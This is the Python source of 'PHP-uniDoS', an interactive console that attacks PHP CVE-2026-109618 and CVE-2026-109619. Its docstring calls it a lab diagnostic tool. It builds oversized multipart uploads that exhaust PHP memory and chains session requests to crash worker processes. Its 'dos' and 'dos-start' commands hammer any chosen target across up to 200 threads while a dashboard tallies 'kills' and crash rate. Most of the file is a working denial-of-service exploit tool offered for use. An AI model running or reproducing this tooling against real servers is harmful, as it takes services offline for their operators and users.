#!/usr/bin/env python3
"""Interactive diagnostic console for the PHP CVE-2026-109618/109619 lab."""

import http.client
import json
import secrets
import shlex
import sys
import time
from http.cookies import SimpleCookie

try:
    import readline
except ImportError:
    try:
        import pyreadline3 as readline
    except ImportError:
        pass

from attacker import (
    BOUNDARY, parse_target, endpoint_path, send, lab_health, php_post_max_bytes,
    php_size_bytes,
    multipart_part_headers, multipart_empty_files, multipart_form_value,
    multipart_files_registration,
)
from session_progress_probe import (
    multipart_producer, multipart_consumer,
    request as session_request, session_file_state,
)


def human_size(n):
    for unit in ('B', 'KiB', 'MiB', 'GiB'):
        if abs(n) < 1024:
            return f"{n:.0f} {unit}" if n == int(n) else f"{n:.1f} {unit}"
        n /= 1024
    return f"{n:.1f} TiB"


BANNER = r"""
 ____    _   _   ____                           _   ____            ____
|  _ \  | | | | |  _ \          _   _   _ __   (_) |  _ \    ___   / ___|
| |_) | | |_| | | |_) |  ____  | | | | | '_ \  | | | | | |  / _ \  \___ \
|  __/  |  _  | |  __/  |____| | |_| | | | | | | | | |_| | | (_) |  ___) |
|_|     |_| |_| |_|             \__,_| |_| |_| |_| |____/   \___/  |____/

  PHP CVE-2026-109618 / CVE-2026-109619  DoS Console

  target <url>        Set target (e.g. target 192.168.1.10:8088)
  health              Health check
  109618 [strategy]   Multipart parser OOM probe
  109619              Experimental backtrace -> early INI probe
  session             Session lifecycle probe (A->B, single round)
  dos [rounds]        Sustained DoS — simple log
  dos-start           Sustained DoS — live dashboard (Ctrl+C to stop)
  set                 Show settable parameters
  show                Show current config
  help                Full help
"""

HELP = """
Commands:
  target <url>                Set target URL (e.g. http://192.168.1.10:8088)
  show                        Show current settings
  health                      Send health check to target
  109618 [strategy]           Probe CVE-2026-109618 multipart OOM
                              Strategies: part-headers, empty-files, form-value, files-registration
  109619                      Experimental fatal-backtrace -> early INI path
  session                     Probe CVE-2026-109619 session A->B path (single round)
  dos [rounds]                Sustained DoS — simple log output
  dos-start                   Sustained DoS — live dashboard (Ctrl+C to stop)
  set <key> <value>           Set parameter (see 'set' for list)
  help                        Show this help
  exit / quit                 Exit
"""

SET_HELP = """
Settable parameters (payload sizes are explicit; check effective endpoint limits):
  health <path>               Health endpoint (default: oom/health.php)
  upload <path>               Upload endpoint (default: oom/upload.php)
  producer <path>             Fatal producer endpoint (default: fatal-backtrace.php)
  consumer <path>             Early consumer endpoint (default: early/health.php)
  seed <path>                 Session seed endpoint (default: session/session-seed.php)
  session-health <path>       Session health endpoint (default: session/health.php)
  session-upload <path>       Session upload endpoint (default: session/upload.php)
  session-name <name>         PHP session cookie name (default: PHPSESSID)
  threads <n>                 DoS concurrency (default: 10)
  part-headers <n>            Part header count (default: 653000)
  empty-files <n>             Empty file count (conditional experiment)
  field-bytes <n>             Form value / session padding size (default: 6 MiB)
  timeout <seconds>           Request timeout (default: 60)
  expected-php <version>      Expected PHP version (default: 8.5.11)
"""


class Console:
    def __init__(self):
        self.target = None
        self.scheme = self.host = self.port = self.prefix = None
        self.endpoints = {
            "health": "",
            "upload": "",
            "producer": "fatal-backtrace.php",
            "consumer": "early/health.php",
            "seed": "",
            "session-health": "",
            "session-upload": "",
        }
        self.target_mem_limit = None
        self.target_post_max = None
        self.part_headers = 653_000
        self.empty_files = 500
        self.field_bytes = 6 * 1024 * 1024
        self.pad_kib = 1340
        self.field_name_kib = 700
        self.session_name = "PHPSESSID"
        self.dos_threads = 10
        self.timeout = 60.0
        self.expected_php = "8.5.11"

    def path(self, name):
        ep = self.endpoints[name]
        if not ep:
            return self.prefix or "/"
        return endpoint_path(self.prefix, ep)

    def run(self):
        print(BANNER)
        if len(sys.argv) > 1:
            self.cmd_target(sys.argv[1])
        while True:
            try:
                line = input("\033[1;31mDoS>\033[0m ").strip().lstrip("﻿")
            except (EOFError, KeyboardInterrupt):
                print()
                break
            if not line:
                continue
            parts = shlex.split(line)
            cmd = parts[0].lower()
            args = parts[1:]
            handler = {
                "target": self.cmd_target,
                "show": lambda *_: self.cmd_show(),
                "health": lambda *_: self.cmd_health(),
                "109618": self.cmd_109618,
                "109619": lambda *_: self.cmd_109619(),
                "session": lambda *_: self.cmd_session(),
                "dos": self.cmd_dos,
                "dos-start": lambda *_: self.cmd_dos_start(),
                "set": self.cmd_set,
                "help": lambda *_: print(HELP),
                "exit": lambda *_: sys.exit(0),
                "quit": lambda *_: sys.exit(0),
            }.get(cmd)
            if handler is None:
                print(f"Unknown command: {cmd}. Type 'help' for commands.")
                continue
            try:
                handler(*args)
            except Exception as exc:
                print(f"\033[91mError: {exc}\033[0m")

    def _detect_mem_limit(self, body_prefix):
        try:
            data = json.loads(body_prefix)
        except (json.JSONDecodeError, ValueError, TypeError):
            return
        mem_str = data.get("memory_limit")
        post_str = data.get("post_max_size")
        self.target_mem_limit = php_size_bytes(mem_str)
        self.target_post_max = php_size_bytes(post_str)

    def _lab_get(self, name, request_id, *, upload_progress=False):
        result = send(self.scheme, self.host, self.port, "GET",
                      self.path(name), self.timeout, None, request_id)
        data, failure = lab_health(result, self.expected_php, "apache2handler")
        if not failure and upload_progress and str(data.get("upload_progress")) not in ("1", "On"):
            failure = "session upload_progress is disabled"
        if failure:
            print(f"  Preflight failed ({name}): {failure}; {result.get('transport_error', '')}")
            return None, result
        self._detect_mem_limit(result.get("body_prefix", ""))
        return data, result

    @staticmethod
    def _body_fits(body, endpoint_data):
        if "post_max_size" not in endpoint_data:
            print("  Preflight failed: endpoint did not report post_max_size")
            return False
        try:
            post_max = php_post_max_bytes(endpoint_data["post_max_size"])
        except ValueError as exc:
            print(f"  Preflight failed: {exc}")
            return False
        if post_max is not None and len(body) >= post_max:
            print(f"  Preflight failed: body {len(body)} bytes reaches post_max_size {post_max} bytes")
            return False
        return True

    @staticmethod
    def _report_transport_and_pid(result, before_pid):
        if "transport_error" in result:
            print(f"  Transport anomaly: {result['transport_error']}")
        else:
            print(f"  HTTP {result.get('http_status')} ({result.get('elapsed_ms')} ms)")
        after_pid = result.get("worker_pid_header")
        if before_pid and after_pid and before_pid != after_pid:
            print(f"  PID changed {before_pid} -> {after_pid}; cause requires server log/dump")
        elif before_pid and before_pid == after_pid:
            print(f"  Same PID observed: {before_pid}")

    def require_target(self):
        if self.target is None:
            raise RuntimeError("No target set. Use: target <url>")

    def cmd_target(self, url=None):
        if url is None:
            if self.target:
                print(f"Current target: {self.target}")
            else:
                print("No target set. Usage: target <url>")
            return
        if not url.startswith(("http://", "https://")):
            url = "http://" + url
        self.scheme, self.host, self.port, self.prefix = parse_target(url)
        self.target = url
        self.target_mem_limit = None
        self.target_post_max = None
        print(f"\033[92mTarget set: {self.scheme}://{self.host}:{self.port}{self.prefix}\033[0m")

    def cmd_show(self):
        print(f"  target:        {self.target or '(not set)'}")
        mem = human_size(self.target_mem_limit) if self.target_mem_limit else "(unknown)"
        post = human_size(self.target_post_max) if self.target_post_max else "(unknown)"
        print(f"  memory_limit:  {mem}")
        print(f"  post_max_size: {post}")
        for k, v in self.endpoints.items():
            print(f"  {k:16s} {v}")
        print(f"  session-name:  {self.session_name}")
        print(f"  threads:       {self.dos_threads}")
        print(f"  part-headers:  {self.part_headers:,}")
        print(f"  empty-files:   {self.empty_files:,}")
        print(f"  field-bytes:   {self.field_bytes:,} ({human_size(self.field_bytes)})")
        print(f"  timeout:       {self.timeout}s")
        print(f"  expected-php:  {self.expected_php}")

    def cmd_health(self):
        self.require_target()
        print(f"GET {self.path('health')} ...")
        result = send(self.scheme, self.host, self.port, "GET",
                      self.path("health"), self.timeout, None, "health-check")
        if "transport_error" in result:
            print(f"\033[91m{result['transport_error']}\033[0m")
            return
        print(f"HTTP {result['http_status']} ({result['elapsed_ms']}ms)")
        body_prefix = result.get("body_prefix", "")
        try:
            data = json.loads(body_prefix)
            print(f"  PHP:  {data.get('php')}")
            print(f"  SAPI: {data.get('sapi')}")
            print(f"  PID:  {data.get('pid')}")
            print(f"  Mem:  {data.get('memory_limit')}")
            print(f"  Post: {data.get('post_max_size')}")
            self._detect_mem_limit(body_prefix)
        except json.JSONDecodeError:
            print(f"  Body: {body_prefix[:200]}")

    def cmd_109618(self, strategy=None):
        self.require_target()
        strategy = strategy or "part-headers"
        strategies = {
            "part-headers": lambda: multipart_part_headers(self.part_headers),
            "empty-files": lambda: multipart_empty_files(self.empty_files),
            "form-value": lambda: multipart_form_value(self.field_bytes),
            "files-registration": lambda: multipart_files_registration(
                self.pad_kib * 1024, self.field_name_kib * 1024),
        }
        if strategy not in strategies:
            print(f"Unknown strategy. Choose: {', '.join(strategies)}")
            return
        print(f"\033[93m[CVE-2026-109618] OOM attack — {strategy}\033[0m")
        body = strategies[strategy]()
        upload_path = self.path("upload")
        print(f"Step 1: Baseline GET {upload_path}...")
        baseline = send(self.scheme, self.host, self.port, "GET",
                        upload_path, self.timeout, None, "oom-baseline")
        if "transport_error" in baseline:
            print(f"  \033[91m{baseline['transport_error']}\033[0m")
            return
        baseline_pid = baseline.get("worker_pid_header")
        print(f"  HTTP {baseline.get('http_status')}"
              f"{f', PID {baseline_pid}' if baseline_pid else ''}")
        print(f"Step 2: Sending {human_size(len(body))} multipart ({strategy}, {self.part_headers:,} headers)...")
        result = send(self.scheme, self.host, self.port, "POST",
                      upload_path, self.timeout, None, "oom-candidate",
                      body, f"multipart/form-data; boundary={BOUNDARY}")
        if "transport_error" in result:
            print(f"  \033[91m{result['transport_error']}\033[0m")
            return
        body_text = result.get("body_prefix", "")
        oom_observed = "Allowed memory size" in body_text and "exhausted" in body_text
        print(f"  HTTP {result.get('http_status')} ({result.get('elapsed_ms')}ms)")
        if oom_observed:
            print("  \033[93mOOM triggered!\033[0m")
        print(f"  Body: {body_text[:200]}")
        print(f"Step 3: Verify — GET {upload_path}...")
        after = send(self.scheme, self.host, self.port, "GET",
                     upload_path, self.timeout, None, "oom-after")
        if "transport_error" in after:
            print(f"  \033[91mServer unreachable: {after['transport_error']}\033[0m")
        else:
            after_pid = after.get("worker_pid_header")
            print(f"  HTTP {after.get('http_status')}"
                  f"{f', PID {after_pid}' if after_pid else ''}")
            if oom_observed and baseline_pid and after_pid:
                if baseline_pid == after_pid:
                    print(f"  \033[92mOOM confirmed — same worker {baseline_pid} survived (PHP fatal, not process crash)\033[0m")
                else:
                    print(f"  \033[92mOOM + worker replaced! PID {baseline_pid} → {after_pid}\033[0m")

    def cmd_109619(self):
        self.require_target()
        print("[CVE-2026-109619] Experimental fatal-backtrace -> early INI probe")
        baseline_data, baseline = self._lab_get("health", "109619-baseline")
        if baseline_data is None:
            return
        if str(baseline_data.get("fatal_error_backtraces")) not in ("1", "On"):
            print("  Preflight failed: fatal_error_backtraces is not enabled")
            return
        consumer_data, consumer_control = self._lab_get("consumer", "109619-consumer-control")
        if consumer_data is None:
            return
        if str(consumer_data.get("auto_detect_line_endings")) not in ("1", "On"):
            print("  Preflight failed: early INI diagnostic is not active")
            return
        print("  Sending fatal producer...")
        producer = send(self.scheme, self.host, self.port, "GET",
                        self.path("producer"), self.timeout, None, "fatal-producer")
        self._report_transport_and_pid(producer, consumer_control.get("worker_pid_header"))
        if producer.get("http_status") != 500 or producer.get("lab_producer_header") != "fatal-backtrace":
            print("  Stopping: fatal producer marker/HTTP 500 not observed")
            return
        producer_pid = producer.get("worker_pid_header")
        print("  Sending early consumer...")
        consumer = send(self.scheme, self.host, self.port, "GET",
                        self.path("consumer"), self.timeout, None, "early-consumer")
        self._report_transport_and_pid(consumer, producer_pid)
        consumer_pid = consumer.get("worker_pid_header")
        if producer_pid and consumer_pid:
            print(f"  A/B same worker observed: {producer_pid == consumer_pid}")
        print("  HTTP alone cannot establish stale-state access or a worker crash")

    def cmd_session(self):
        self.require_target()
        print("\033[93m[CVE-2026-109619] Session A→B worker crash\033[0m")
        producer_body = multipart_producer(self.field_bytes, "candidate",
                                           part_headers=self.part_headers)
        seed_path = self.path("seed")
        print(f"Step 1: Acquiring session cookie (GET {seed_path})...")
        seed, set_cookie = session_request(self.scheme, self.host, self.port, "GET",
                                           seed_path, timeout=self.timeout)
        cookies = SimpleCookie()
        if set_cookie:
            cookies.load(set_cookie)
        session_name = None
        for name in cookies:
            session_name = name
            break
        if session_name:
            sid = cookies[session_name].value
            cookie = f"{session_name}={sid}"
            print(f"  Got {session_name}={sid[:8]}...")
        else:
            sid = secrets.token_hex(16)
            cookie = f"{self.session_name}={sid}"
            print(f"  No cookie from server — generated {self.session_name}={sid[:8]}...")
            print(f"  (default session.use_strict_mode=0 accepts any ID)")
        upload_path = self.path("session-upload")
        print(f"Step 2: Baseline GET {upload_path}...")
        baseline, _ = session_request(self.scheme, self.host, self.port, "GET",
                                      upload_path, timeout=self.timeout)
        if "transport_error" in baseline:
            print(f"  \033[91m{baseline['transport_error']}\033[0m")
            return
        baseline_pid = baseline.get("worker_pid_header")
        print(f"  HTTP {baseline.get('http_status')}"
              f"{f', PID {baseline_pid}' if baseline_pid else ''}")
        print(f"Step 3: Producer A ({human_size(len(producer_body))} with session progress)...")
        producer, _ = session_request(self.scheme, self.host, self.port, "POST",
                                      upload_path, body=producer_body,
                                      cookie=cookie, timeout=self.timeout)
        if "transport_error" in producer:
            print(f"  \033[91m{producer['transport_error']}\033[0m")
            return
        body_text = producer.get("body_prefix", "")
        oom_observed = "Allowed memory size" in body_text and "exhausted" in body_text
        if oom_observed:
            print("  \033[93mOOM triggered!\033[0m")
        else:
            print(f"  HTTP {producer.get('http_status')} — no OOM, aborting")
            print(f"  Body: {body_text[:200]}")
            return
        consumer_body = multipart_consumer()
        print("Step 4: Consumer B (session progress callback on stale state)...")
        consumer, _ = session_request(self.scheme, self.host, self.port, "POST",
                                      upload_path, body=consumer_body,
                                      cookie=cookie, timeout=self.timeout)
        consumer_crashed = "transport_error" in consumer
        if consumer_crashed:
            print(f"  \033[91m{consumer['transport_error']}\033[0m")
        else:
            print(f"  HTTP {consumer.get('http_status')} ({consumer.get('elapsed_ms')}ms)")
        print(f"Step 5: Verify — GET {upload_path}...")
        after, _ = session_request(self.scheme, self.host, self.port, "GET",
                                   upload_path, timeout=self.timeout)
        if "transport_error" in after:
            print(f"  \033[91mServer unreachable: {after['transport_error']}\033[0m")
            if consumer_crashed:
                print("  \033[92mServer down — worker crash confirmed\033[0m")
        else:
            after_pid = after.get("worker_pid_header")
            print(f"  HTTP {after.get('http_status')}"
                  f"{f', PID {after_pid}' if after_pid else ''}")
            if consumer_crashed:
                if baseline_pid and after_pid and baseline_pid != after_pid:
                    print(f"  \033[92mWorker crashed! PID {baseline_pid} → {after_pid}\033[0m")
                elif baseline_pid and after_pid and baseline_pid == after_pid:
                    print("  \033[93mSame PID — may have hit a different worker\033[0m")
                else:
                    print("  \033[92mWorker crashed! (connection reset + server recovered)\033[0m")
            else:
                print("  Worker survived — may need a different endpoint or settings")

    def _dos_round(self, upload_path, producer_body, consumer_body):
        sid = secrets.token_hex(16)
        cookie = f"{self.session_name}={sid}"
        headers = {
            "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
            "Cookie": cookie,
            "Connection": "keep-alive",
        }
        conn = http.client.HTTPConnection(self.host, self.port,
                                          timeout=self.timeout)
        try:
            conn.request("POST", upload_path, body=producer_body, headers=headers)
            resp = conn.getresponse()
            body = resp.read(2048)
            if b"Allowed memory size" not in body:
                return "no_oom"
            conn.request("POST", upload_path, body=consumer_body, headers=headers)
            resp = conn.getresponse()
            resp.read()
            return "survived"
        except (OSError, http.client.HTTPException):
            return "crashed"
        finally:
            conn.close()

    def cmd_dos(self, rounds_str=None):
        import threading
        self.require_target()
        rounds = int(rounds_str) if rounds_str else 0
        threads = self.dos_threads
        label = f"{rounds} rounds" if rounds else "infinite — Ctrl+C to stop"
        print(f"\033[93m[CVE-2026-109619] Sustained DoS ({label}, {threads} threads)\033[0m")
        upload_path = self.path("session-upload")
        producer_body = multipart_producer(self.field_bytes, "candidate",
                                           part_headers=self.part_headers)
        consumer_body = multipart_consumer()
        print(f"  Keep-alive pinning: Producer A + Consumer B on same connection")
        print(f"  Payload: {human_size(len(producer_body))}\n")
        lock = threading.Lock()
        crashed = 0
        failed = 0
        counter = 0
        stop = threading.Event()
        start = time.monotonic()

        def worker():
            nonlocal crashed, failed, counter
            while not stop.is_set():
                with lock:
                    if rounds and counter >= rounds:
                        return
                    counter += 1
                    my_i = counter
                result = self._dos_round(upload_path, producer_body, consumer_body)
                with lock:
                    if result == "crashed":
                        crashed += 1
                        elapsed = time.monotonic() - start
                        rate = crashed / elapsed if elapsed > 0 else 0
                        print(f"  #{my_i}: \033[92mcrashed\033[0m"
                              f"  ({crashed} kills, {rate:.2f}/s)")
                    else:
                        failed += 1
                        print(f"  #{my_i}: \033[91m{result}\033[0m")

        pool = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
        try:
            for t in pool:
                t.start()
            for t in pool:
                while t.is_alive():
                    t.join(0.2)
        except KeyboardInterrupt:
            stop.set()
            print()
        elapsed = time.monotonic() - start
        print(f"\n\033[93m  {crashed} workers crashed, {failed} failed,"
              f" {counter} rounds in {elapsed:.1f}s\033[0m")
        if crashed and elapsed > 0:
            print(f"  \033[92m{crashed / elapsed:.2f} crashes/sec\033[0m")

    def cmd_dos_start(self):
        import threading
        self.require_target()
        threads = self.dos_threads
        upload_path = self.path("session-upload")
        producer_body = multipart_producer(self.field_bytes, "candidate",
                                           part_headers=self.part_headers)
        consumer_body = multipart_consumer()
        payload_size = human_size(len(producer_body))
        lock = threading.Lock()
        crashed = 0
        failed = 0
        log = []
        stop = threading.Event()
        start_time = time.monotonic()
        LOG_MAX = 14

        def attack_worker():
            nonlocal crashed, failed
            while not stop.is_set():
                result = self._dos_round(upload_path, producer_body, consumer_body)
                if stop.is_set():
                    return
                ts = time.strftime("%H:%M:%S")
                with lock:
                    if result == "crashed":
                        crashed += 1
                    else:
                        failed += 1
                    total = crashed + failed
                    log.append((ts, total, result))
                    if len(log) > LOG_MAX:
                        del log[0]

        def draw():
            elapsed = time.monotonic() - start_time
            hrs, rem = divmod(int(elapsed), 3600)
            mins, secs = divmod(rem, 60)
            uptime = f"{hrs:02d}:{mins:02d}:{secs:02d}"
            with lock:
                c, f = crashed, failed
                recent = list(log)
            r = c + f
            rate = c / elapsed if elapsed > 0 else 0
            pct = f"{c * 100 // r}%" if r > 0 else "--"
            bar = "─" * 58
            out = []
            out.append("")
            out.append(f"  \033[1;93mPHP-uniDoS\033[0m  CVE-2026-109619  \033[1mSustained DoS\033[0m")
            out.append(f"  Target:  \033[97m{self.target}\033[0m")
            out.append(f"  Threads: {threads}  |  Payload: {payload_size}  |  Keep-alive")
            out.append(f"  {bar}")
            out.append(f"  \033[1mUptime:\033[0m {uptime}    "
                       f"\033[1mKills:\033[0m \033[92m{c}\033[0m    "
                       f"\033[1mRate:\033[0m \033[92m{rate:.2f}/s\033[0m")
            out.append(f"  \033[1mRounds:\033[0m {r:<8d}  "
                       f"\033[1mFailed:\033[0m {f:<6d}  "
                       f"\033[1mSuccess:\033[0m {pct}")
            out.append(f"  {bar}")
            for ts, num, result in reversed(recent):
                if result == "crashed":
                    tag = f"\033[92m{'KILL':>8s}\033[0m"
                else:
                    tag = f"\033[91m{result:>8s}\033[0m"
                out.append(f"  \033[2m{ts}\033[0m  #{num:<6d} {tag}")
            for _ in range(LOG_MAX - len(recent)):
                out.append("")
            out.append(f"  {bar}")
            out.append(f"  \033[2mCtrl+C to stop\033[0m")
            out.append("")
            sys.stdout.write("\033[H")
            for line in out:
                sys.stdout.write(f"{line}\033[K\n")
            sys.stdout.flush()

        sys.stdout.write("\033[2J\033[H")
        sys.stdout.write("\033[?25l")
        sys.stdout.flush()
        pool = [threading.Thread(target=attack_worker, daemon=True)
                for _ in range(threads)]
        try:
            for t in pool:
                t.start()
            while any(t.is_alive() for t in pool):
                draw()
                time.sleep(0.5)
            draw()
        except KeyboardInterrupt:
            stop.set()
            for t in pool:
                t.join(timeout=2)
        finally:
            sys.stdout.write("\033[?25h")
            sys.stdout.flush()
        elapsed = time.monotonic() - start_time
        with lock:
            c, f = crashed, failed
        r = c + f
        sys.stdout.write("\033[2J\033[H")
        print(f"\033[1;93mPHP-uniDoS\033[0m  Sustained DoS — finished\n")
        print(f"  Target:  {self.target}")
        print(f"  Threads: {threads}  |  Payload: {payload_size}\n")
        print(f"  \033[1mWorkers crashed:\033[0m  \033[92m{c}\033[0m")
        print(f"  \033[1mFailed rounds:\033[0m    {f}")
        print(f"  \033[1mTotal rounds:\033[0m     {r}")
        print(f"  \033[1mDuration:\033[0m         {elapsed:.1f}s")
        if c and elapsed > 0:
            print(f"  \033[1mCrash rate:\033[0m       \033[92m{c / elapsed:.2f}/s\033[0m")
        print()

    def cmd_set(self, key=None, value=None, *_):
        if key is None:
            print(SET_HELP)
            return
        if value is None:
            print(f"Usage: set {key} <value>")
            return
        if key in self.endpoints:
            endpoint_path(self.prefix or "", value)
            self.endpoints[key] = value
            self.target_mem_limit = None
            self.target_post_max = None
            print(f"  {key} = {value}")
        elif key == "session-name":
            self.session_name = value
            print(f"  session-name = {self.session_name}")
        elif key == "threads":
            number = int(value)
            if number < 1 or number > 200:
                raise ValueError("threads must be 1..200")
            self.dos_threads = number
            print(f"  threads = {self.dos_threads}")
        elif key == "part-headers":
            number = int(value)
            if number < 1:
                raise ValueError("part-headers must be >= 1")
            self.part_headers = number
            print(f"  part-headers = {self.part_headers}")
        elif key == "empty-files":
            number = int(value)
            if not 1 <= number <= 10000:
                raise ValueError("empty-files must be 1..10000")
            self.empty_files = number
            print(f"  empty-files = {self.empty_files}")
        elif key == "field-bytes":
            number = int(value)
            if not 1 <= number <= 64 * 1024 * 1024:
                raise ValueError("field-bytes must be 1..67108864")
            self.field_bytes = number
            print(f"  field-bytes = {self.field_bytes}")
        elif key == "timeout":
            number = float(value)
            if not 0.5 <= number <= 60:
                raise ValueError("timeout must be 0.5..60 seconds")
            self.timeout = number
            print(f"  timeout = {self.timeout}s")
        elif key == "expected-php":
            self.expected_php = value
            print(f"  expected-php = {self.expected_php}")
        else:
            print(f"Unknown parameter: {key}")
            print(SET_HELP)


if __name__ == "__main__":
    Console().run()
